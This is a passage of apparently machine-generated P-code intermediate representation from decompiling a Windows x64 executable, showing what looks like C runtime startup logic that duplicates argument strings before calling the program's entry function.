(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xb0, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xb0, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xb0, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xb0, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xb0, 4)
 ---  CALL (ram, 0x140001af0, 8)
(unique, 0x10000385, 8) CAST (ram, 0x140004630, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xb5, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xb5, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xb5, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xb5, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xb5, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xb5, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xb5, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xb5, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xb5, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xb5, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xb5, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xb5, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xb5, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xb5, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xb5, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xb5, 4)
(register, 0x0, 8) CALL (ram, 0x1400081d8, 8) , (unique, 0x10000385, 8)
(unique, 0x1000038d, 8) CAST (ram, 0x140004590, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xb9, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xb9, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xb9, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xb9, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xb9, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xb9, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xb9, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xb9, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xb9, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xb9, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xb9, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xb9, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xb9, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xb9, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xb9, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xb9, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x1000038d, 8) , (register, 0x0, 8)
(unique, 0x100002a9, 8) PTRSUB (const, 0x0, 8) , (const, 0x140001000, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xbc, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xbc, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xbc, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xbc, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xbc, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xbc, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xbc, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xbc, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xbc, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xbc, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xbc, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xbc, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xbc, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xbc, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xbc, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xbc, 4)
 ---  CALL (ram, 0x140002740, 8) , (unique, 0x100002a9, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xbf, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xbf, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xbf, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xbf, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xbf, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xbf, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xbf, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xbf, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xbf, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xbf, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xbf, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xbf, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xbf, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xbf, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xbf, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xbf, 4)
 ---  CALL (ram, 0x140001900, 8)
(unique, 0x100002f5, 4) COPY (ram, 0x140007028, 4)
(unique, 0x4400, 4) INT_ADD (ram, 0x140007028, 4) , (const, 0x1, 4)
(register, 0x38, 8) INT_SEXT (unique, 0x4400, 4)
(register, 0x38, 8) INT_MULT (register, 0x38, 8) , (const, 0x8, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xee, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xee, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xee, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xee, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xee, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xee, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xee, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xee, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xee, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xee, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xee, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xee, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xee, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xee, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xee, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xee, 4)
(unique, 0x10000395, 8) CALL (ram, 0x1400027e8, 8) , (register, 0x38, 8)
(register, 0x0, 8) CAST (unique, 0x10000395, 8)
(unique, 0x100002ed, 8) COPY (ram, 0x140007020, 8)
(unique, 0xed00, 1) INT_SLESS (const, 0x0, 4) , (unique, 0x100002f5, 4)
(unique, 0x1000030d, 8) COPY (register, 0x0, 8)
 ---  CBRANCH (ram, 0x1400013c0, 1) , (unique, 0xed00, 1)
(register, 0x38, 8) INT_SUB (register, 0x38, 8) , (const, 0x8, 8)
(register, 0x18, 8) COPY (const, 0x0, 8)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(register, 0x18, 8) MULTIEQUAL (register, 0x18, 8) , (register, 0x18, 8)
(unique, 0x1000039d, 8) CAST (unique, 0x100002ed, 8)
(unique, 0x100003a5, 8) INT_ADD (unique, 0x1000039d, 8) , (register, 0x18, 8)
(unique, 0x4700, 8) CAST (unique, 0x100003a5, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4700, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x116, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x116, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x116, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x116, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x116, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x116, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x116, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x116, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x116, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x116, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x116, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x116, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x116, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x116, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x116, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x116, 4)
(register, 0x0, 8) CALL (ram, 0x140002808, 8) , (unique, 0xdc00, 8)
(unique, 0x4400, 8) INT_ADD (register, 0x0, 8) , (const, 0x1, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x11c, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x11c, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x11c, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x11c, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x11c, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x11c, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x11c, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x11c, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x11c, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x11c, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x11c, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x11c, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x11c, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x11c, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x11c, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x11c, 4)
(register, 0x0, 8) CALL (ram, 0x1400027e8, 8) , (unique, 0x4400, 8)
(unique, 0x100003ad, 8) CAST (register, 0x0, 8)
(unique, 0x100003b5, 8) INT_ADD (unique, 0x100003ad, 8) , (register, 0x18, 8)
(unique, 0x4e80, 8) CAST (unique, 0x100003b5, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x121, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x121, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x121, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x121, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x121, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x121, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x121, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x121, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x121, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x121, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x121, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x121, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x121, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x121, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x121, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x121, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4e80, 8) , (register, 0x0, 8)
(unique, 0x100003bd, 8) CAST (unique, 0x100002ed, 8)
(unique, 0x100003c5, 8) INT_ADD (unique, 0x100003bd, 8) , (register, 0x18, 8)
(unique, 0x4700, 8) CAST (unique, 0x100003c5, 8)
(unique, 0x100003cd, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4700, 8)
(unique, 0xdc00, 8) CAST (unique, 0x100003cd, 8)
(register, 0x18, 8) INT_ADD (register, 0x18, 8) , (const, 0x8, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x132, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x132, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x132, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x132, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x132, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x132, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x132, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x132, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x132, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x132, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x132, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x132, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x132, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x132, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x132, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x132, 4)
 ---  CALL (ram, 0x1400027f0, 8) , (register, 0x0, 8) , (unique, 0xdc00, 8) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x38, 8) , (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001280, 1) , (register, 0x206, 1)
(unique, 0x100002b1, 8) INT_ADD (register, 0x38, 8) , (const, 0xffffffffffffffff, 8)
(register, 0x38, 8) PTRADD (register, 0x0, 8) , (unique, 0x100002b1, 8) , (const, 0x8, 8)
(unique, 0x10000305, 8) COPY (register, 0x38, 8)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(register, 0x38, 8) MULTIEQUAL (unique, 0x10000305, 8) , (unique, 0x1000030d, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x149, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x149, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x149, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x149, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x149, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x149, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x149, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x149, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x149, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x149, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x149, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x149, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x149, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x149, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x149, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x38, 8) , (const, 0x0, 8)
(unique, 0x10000315, 8) COPY (register, 0x0, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x14d, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x14d, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x14d, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x14d, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x14d, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x14d, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x14d, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x14d, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x14d, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x14d, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x14d, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x14d, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x14d, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x14d, 4)
(ram, 0x140007020, 8) INDIRECT (unique, 0x10000315, 8) , (const, 0x14d, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x14d, 4)
 ---  CALL (ram, 0x140001700, 8)
(unique, 0x100002f9, 4) COPY (ram, 0x140007028, 4)
(unique, 0x100002e5, 8) COPY (ram, 0x140007018, 8)
(unique, 0x100003d5, 8) CAST (ram, 0x140004520, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x100003d5, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x155, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x155, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x155, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x155, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x155, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x155, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x155, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x155, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x155, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x155, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x155, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x155, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x155, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x155, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x155, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x155, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0xdc00, 8) , (ram, 0x140007018, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x159, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x159, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x159, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x159, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x159, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x159, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x159, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x159, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x159, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x159, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x159, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x159, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x159, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x159, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x159, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x159, 4)
(register, 0x0, 4) CALL (ram, 0x140001633, 8) , (unique, 0x100002f9, 4) , (ram, 0x140007020, 8) , (unique, 0x100002e5, 8)
(ram, 0x140007010, 4) COPY (register, 0x0, 4)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x14000700c, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400013c8, 1) , (register, 0x206, 1)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x1bc, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x1bc, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x1bc, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x1bc, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x1bc, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x1bc, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x1bc, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x1bc, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x1bc, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x1bc, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x1bc, 4)
